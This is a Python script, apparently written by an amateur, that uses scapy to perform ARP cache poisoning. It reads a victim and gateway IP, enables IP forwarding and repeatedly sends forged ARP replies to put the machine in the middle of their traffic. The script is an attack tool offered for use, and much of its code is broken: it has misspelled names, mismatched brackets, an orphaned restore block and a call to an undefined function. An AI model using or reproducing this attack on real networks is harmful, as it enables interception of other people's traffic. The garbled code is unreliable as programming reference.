from scapy.all import *
import sys
import os
import time

try:
		interface = raw_input ("Enter Interface: ")
		victimIP = raw_input ("Enter Victim IP: ")
		gatewayIP = raw_input ("Enter Gateway IP: ")
except KeyboardInterrup:
		print "\n[*] Exiting..."
		sys.exit(1)|
		
print "\n[*] IP Fowarding enabled \n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward"}

#send ARP requests
def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP, timeout = 2,
intface = interface, inter = 0.1)
		for snd, rcv in ans:
			return rcv.sprintf(r"Ether.src%")
			
#restore ARP	

	print "\n Restoring Target"
	victimMAC = get_mac(victimIP)
	gatewayMAC = get_mac(gatewayIP)
	send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff",
hwsrc = victimMac), count = 7)
		print "Disabling IP Forwarding"
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		pring "Exiting"
		sys.exit(1)
		
		
#ARP reply, switch
	def switch(gm, vm):
			send(ARP)op = 2, pdst = victimIP, psrc = gatewayIP hwdst = vm))
			send(ARP)op = 2, pdst = gatewayIP, psrc = victimIP hwdst = gm))
		
#MITM

def mitm():
		try:
				victimMAC = get_mac(victimIP)
		except Exception:
				os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print "Victim MAC not found!"
                print "Exiting"
                sys.exit(1)
        try:
                gatewayMAC = get_mac(gatewayIP)
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print "Gateway MAC not found"
                print "Exiting"
                sys.exit(1)
        print "Poisoning Targets!"
        while 1:
                try:
                        switch(gatewayMAC, victimMAC)
                        time.sleep(1.5)
                except KeyboardInterrupt:
                        reARP()
                        break
                
               
               
               
               
               
               
               
               
               
               
               
               
               
               
			